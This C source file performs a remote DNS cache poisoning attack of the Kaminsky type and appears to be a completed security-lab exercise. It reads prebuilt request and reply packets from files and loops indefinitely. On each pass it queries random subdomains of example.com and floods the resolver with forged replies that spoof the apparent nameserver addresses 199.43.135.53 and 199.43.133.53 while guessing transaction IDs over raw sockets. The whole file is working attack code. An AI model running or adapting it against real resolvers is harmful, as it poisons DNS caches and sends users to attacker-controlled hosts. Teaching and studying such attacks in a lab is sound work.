#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>
#define MAX_FILE_SIZE 1000000
/* IP Header */
struct ipheader {
	unsigned char      iph_ihl:4, iph_ver:4; //IP header length, IP version
	unsigned char      iph_tos; //Type of service
	unsigned short int iph_len; //IP Packet length (data + header)
	unsigned short int iph_ident; //Identification
	unsigned short int iph_flag:3, iph_offset:13; //Fragmentation flag, Flags offset
	unsigned char      iph_ttl; //Time to Live
	unsigned char      iph_protocol; //Protocol type
	unsigned short int iph_chksum; //IP datagram checksum
	struct  in_addr    iph_sourceip; //Source IP address
	struct  in_addr    iph_destip;   //Destination IP address
};
void send_raw_packet(char * packet, int pkt_size);
void send_dns_request(char *, char *, int);
void send_dns_reply(char *, char *, int, unsigned short);
int main()
{
	long i = 0;
	srand(time(NULL));
	// Load the DNS request packet from file
	FILE * f_req = fopen("ip_req.bin", "rb");
	if (!f_req) {
		perror("Can't open 'ip_req.bin'");
		exit(1);
	}
	unsigned char ip_req[MAX_FILE_SIZE];
	int n_req = fread(ip_req, 1, MAX_FILE_SIZE, f_req);
	// Load the first DNS reply packet from file
	FILE * f_rep = fopen("ip_rep.bin", "rb");
	if (!f_rep) {
		perror("Can't open 'ip_rep.bin'");
		exit(1);
	}
	unsigned char ip_rep[MAX_FILE_SIZE];
	int n_rep = fread(ip_rep, 1, MAX_FILE_SIZE, f_rep);
	char a[26]="abcdefghijklmnopqrstuvwxyz";
	while (1) {
		// Generate a random name with length 5
		char name[5];
		for (int k=0; k<5; k++)
			name[k] = a[rand() % 26];
		/* Step 1. Send a DNS request to the targeted local DNS server
				  This will trigger it to send out DNS queries */
		send_dns_request(name, ip_req, n_req);
		// Step 2. Send spoofed replies to the targeted local DNS server.
		// Generate a random transactionID
		unsigned short transaction_id=rand()&0xffff;
		for(int count=0;count < 50; count++)
		{
			printf("attempt # [%ld  %d] , request is [%s.example.com] with transactionID %d\n", i, count+1, name, transaction_id);
			send_dns_reply(name, ip_rep, n_rep, transaction_id);
			transaction_id+=1;
		}
		i++;
	}
}
/* Use for sending DNS request.
 * Add arguments to the function definition if needed.
 * */
void send_dns_request(char *name, char *packet, int pkt_size)
{
	memcpy(packet+41, name, 5);
	unsigned short transaction_id=rand()&0xffff;
	transaction_id = htons(transaction_id);
	memcpy(packet+28, &transaction_id, 2);
	send_raw_packet(packet, pkt_size);
}
/* Use for sending forged DNS reply.
 * Add arguments to the function definition if needed.
 * */
void send_dns_reply(char *name, char *packet, int pkt_size, unsigned short transaction_id)
{
	memcpy(packet+41, name, 5);
	memcpy(packet+64, name, 5);
	transaction_id=htons(transaction_id);
	memcpy(packet+28, &transaction_id, 2);
	unsigned int NSip1 = inet_addr("199.43.135.53");
	memcpy(packet+12, &NSip1, 4);
	send_raw_packet(packet, pkt_size);
	unsigned int NSip2 = inet_addr("199.43.133.53");
	memcpy(packet+12, &NSip2, 4);
	send_raw_packet(packet, pkt_size);
}
/* Send the raw packet out
 *    packet: to contain the entire IP packet, with everything filled out.
 *    pkt_size: the size of the packet.
 * */
void send_raw_packet(char * packet, int pkt_size)
{
	struct sockaddr_in dest_info;
	int enable = 1;
	// Step 1: Create a raw network socket.
	int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	// Step 2: Set socket option.
	setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));
	// Step 3: Provide needed information about destination.
	struct ipheader *ip = (struct ipheader *) packet;
	dest_info.sin_family = AF_INET;
	dest_info.sin_addr = ip->iph_destip;
	// Step 4: Send the packet out.
	sendto(sock, packet, pkt_size, 0, (struct sockaddr *)&dest_info, sizeof(dest_info));
	close(sock);
}